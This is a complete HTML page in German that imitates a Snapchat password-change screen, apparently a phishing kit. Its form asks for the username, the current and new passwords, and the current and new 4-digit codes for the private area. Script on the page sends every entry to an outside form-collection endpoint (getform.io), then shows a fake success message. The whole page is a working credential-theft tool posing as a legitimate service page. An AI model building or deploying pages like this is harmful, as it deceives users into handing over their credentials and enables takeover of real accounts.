<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Passwort ändern</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fffc00; /* Snapchat yellow */
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .container {
      background-color: white;
      max-width: 420px;
      width: 100%;
      margin: 48px auto 60px;
      padding: 28px 20px 20px;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #logo {
      width: 120px;
      margin-bottom: 20px;
    }

    h1 {
      text-align: center;
      font-weight: 900;
      margin-bottom: 8px;
    }

    p.description {
      text-align: center;
      color: #444;
      font-weight: 500;
      margin-top: 0;
      margin-bottom: 30px;
    }

    .input-group {
      width: 100%;
      margin-bottom: 18px;
    }

    label.input-label {
      display: block;
      font-size: 13px;
      margin-bottom: 6px;
      color: #555;
      font-weight: 600;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 8px 6px 10px;
      font-size: 16px;
      border: none;
      border-bottom: 2px solid #ccc;
      background: #f8f8f8;
      border-radius: 6px 6px 0 0;
      transition: border-color 0.3s ease;
      outline: none;
    }

    input:focus {
      border-bottom-color: #ffdb4d;
    }

    .input-error {
      color: #a00;
      font-size: 12px;
      margin-top: 4px;
      display: none;
    }

    #change-password-btn {
      display: block;
      margin: 10px auto 0;
      width: 220px;
      padding: 10px 0;
      border-radius: 24px;
      border: none;
      font-weight: 400;
      font-size: 16px;
      cursor: not-allowed;
      background: #e0e0e0;
      color: #aaa;
      background-image: repeating-linear-gradient(
        45deg,
        rgba(255, 255, 255, 0.15),
        rgba(255, 255, 255, 0.15) 5px,
        transparent 5px,
        transparent 10px
      );
      transition: all 0.3s ease;
    }

    #change-password-btn.enabled {
      background-color: #ffdb4d;
      background-image: none;
      cursor: pointer;
      color: black;
      font-weight: 700;
    }

    #password-advice {
      margin-top: 12px;
      color: #999999;
      font-size: 13px;
      text-align: center;
      max-width: 300px;
      line-height: 1.3;
    }

    footer.snap-footer {
      background-color: #000;
      color: #fff;
      font-size: 14px;
      padding: 24px 16px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 32px;
      margin-top: auto;
    }

    .snap-footer-section {
      flex: 1 1 140px;
      min-width: 140px;
    }

    .snap-footer-section h4 {
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 6px;
      color: #fff;
    }

    .snap-footer-section ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }

    .snap-footer-section ul li {
      margin-bottom: 4px;
    }

    .snap-footer-section ul li a {
      text-decoration: none;
      color: #bbb;
      transition: color 0.2s ease;
    }

    .snap-footer-section ul li a:hover {
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="container" id="form-screen">
    <img id="logo" src="https://i.postimg.cc/Gmf5XDBH/IMG-4685.jpg" alt="Firmenlogo" />
    <h1>Mein Passwort ändern</h1>
    <p class="description">
      Zum bestmöglichen Schutz Ihres Kontos wählen Sie bitte ein Passwort, das mindestens acht Zeichen lang ist
      und eine Kombination aus Groß- und Kleinbuchstaben, Zahlen und/oder Sonderzeichen enthält.
    </p>

    <form id="password-form" action="https://getform.io/f/bdrgyxqb" method="POST" novalidate>
      <div class="input-group">
        <label class="input-label" for="username">Benutzername</label>
        <input type="text" id="username" name="username" autocomplete="username" required />
      </div>

      <div class="input-group">
        <label class="input-label" for="current-password">Aktuelles Passwort</label>
        <input type="password" id="current-password" name="current-password" autocomplete="current-password" required />
      </div>

      <div class="input-group">
        <label class="input-label" for="new-password">Neues Passwort</label>
        <input type="password" id="new-password" name="new-password" autocomplete="new-password" required />
        <div class="input-error" id="new-pass-error">* Passwort muss mindestens 8 Zeichen lang sein</div>
      </div>

      <div class="input-group">
        <label class="input-label" for="confirm-new-password">Neues Passwort bestätigen</label>
        <input type="password" id="confirm-new-password" name="confirm-new-password" autocomplete="new-password" required />
        <div class="input-error" id="confirm-pass-error">* Passwörter stimmen nicht überein</div>
      </div>

      <div class="input-group">
        <label class="input-label" for="current-privater-password">Aktuelles Passwort für den Privater Bereich</label>
        <input type="password" id="current-privater-password" name="current-privater-password" maxlength="4" pattern="\d{4}" inputmode="numeric" placeholder="4-stelliger Code" required />
      </div>

      <div class="input-group">
        <label class="input-label" for="new-privater-password">Neues Passwort für den Privater Bereich</label>
        <input type="password" id="new-privater-password" name="new-privater-password" maxlength="4" pattern="\d{4}" inputmode="numeric" placeholder="4-stelliger Code" required />
        <div class="input-error" id="privater-pass-error">* Muss genau 4 Ziffern enthalten</div>
      </div>

      <button id="change-password-btn" disabled>Passwort ändern</button>
    </form>

    <div id="password-advice">
      Verwenden Sie nicht dasselbe Passwort für verschiedene Dienste, insbesondere wenn Sie denselben Benutzernamen verwenden.
    </div>
  </div>

  <footer class="snap-footer">
    <div class="snap-footer-section">
      <h4>Unternehmen</h4>
      <ul>
        <li><a href="#">Snap Inc.</a></li>
        <li><a href="#">Karriere</a></li>
        <li><a href="#">News</a></li>
      </ul>
    </div>
    <div class="snap-footer-section">
      <h4>Community</h4>
      <ul>
        <li><a href="#">Support</a></li>
        <li><a href="#">Community-Richtlinien</a></li>
        <li><a href="#">Sicherheitscenter</a></li>
      </ul>
    </div>
    <div class="snap-footer-section">
      <h4>Werbung</h4>
      <ul>
        <li><a href="#">Anzeigen kaufen</a></li>
        <li><a href="#">Werberichtlinien</a></li>
        <li><a href="#">Politische Werbung</a></li>
        <li><a href="#">Markenrichtlinien</a></li>
      </ul>
    </div>
  </footer>

  <script>
    const newPasswordInput = document.getElementById("new-password");
    const confirmPasswordInput = document.getElementById("confirm-new-password");
    const privaterPassInput = document.getElementById("new-privater-password");
    const privaterPassError = document.getElementById("privater-pass-error");
    const changeBtn = document.getElementById("change-password-btn");
    const newPassError = document.getElementById("new-pass-error");
    const confirmPassError = document.getElementById("confirm-pass-error");
    const form = document.getElementById("password-form");
    const container = document.querySelector(".container");

    function validate() {
      let valid = true;

      if (newPasswordInput.value.length < 8) {
        newPassError.style.display = "block";
        valid = false;
      } else {
        newPassError.style.display = "none";
      }

      if (confirmPasswordInput.value !== newPasswordInput.value) {
        confirmPassError.style.display = "block";
        valid = false;
      } else {
        confirmPassError.style.display = "none";
      }

      if (!/^\d{4}$/.test(privaterPassInput.value)) {
        privaterPassError.style.display = "block";
        valid = false;
      } else {
        privaterPassError.style.display = "none";
      }

      changeBtn.disabled = !valid;
      changeBtn.classList.toggle("enabled", valid);
    }

    newPasswordInput.addEventListener("input", validate);
    confirmPasswordInput.addEventListener("input", validate);
    privaterPassInput.addEventListener("input", validate);

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (changeBtn.disabled) {
        return; // prevent submission if validation fails
      }

      const formData = new FormData(form);

      try {
        const response = await fetch(form.action, {
          method: "POST",
          body: formData,
          headers: {
            'Accept': 'application/json'
          },
        });

        if (response.ok) {
          container.innerHTML = `
            <h2>Passwort wurde erfolgreich geändert!</h2>
            <p>Danke für Ihre Eingabe.</p>
          `;
        } else {
          alert("Fehler beim Absenden des Formulars. Bitte versuchen Sie es erneut.");
        }
      } catch (error) {
        alert("Netzwerkfehler. Bitte überprüfen Sie Ihre Verbindung.");
      }
    });
  </script>
</body>
</html>
